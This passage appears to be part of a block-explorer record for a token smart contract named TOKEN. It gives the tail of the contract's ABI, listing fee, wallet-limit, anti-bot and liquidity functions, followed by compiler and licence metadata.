name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isRemoveV2\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isWalletLimitExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"multiAgainst\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"d\",\"type\":\"uint256\"}],\"name\":\"multiKAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addresses\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"multiWLs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLiquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAddLiquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setAntiBotEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setBNumber\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddr\",\"type\":\"address\"}],\"name\":\"setBuyBackReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newAddr\",\"type\":\"address\"}],\"name\":\"setBuyBackToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"setClaims\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"}],\"name\":\"setFundAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"nFundFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nLpFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nDividendFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nBuyBack\",\"type\":\"uint256\"}],\"name\":\"setInNew\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"status\",\"type\":\"bool\"}],\"name\":\"setLimitEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setMaxWalletLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"nFundFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nLpFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nDividendFee\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"nBuyBack\",\"type\":\"uint256\"}],\"name\":\"setOutNew\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setRemoveLiquidityFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setSwapAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"setSwapPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setTransferFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"holder\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"exempt\",\"type\":\"bool\"}],\"name\":\"setisWalletLimitExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startLPBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"stopLP\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapAtAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"transferFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"trueFirstBuyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"userMaxWalletAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "TOKEN", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://6cbe3618d23a9552bb9dd4ddce5aedd4f771d41146343a13c2518a01b4c85a85"}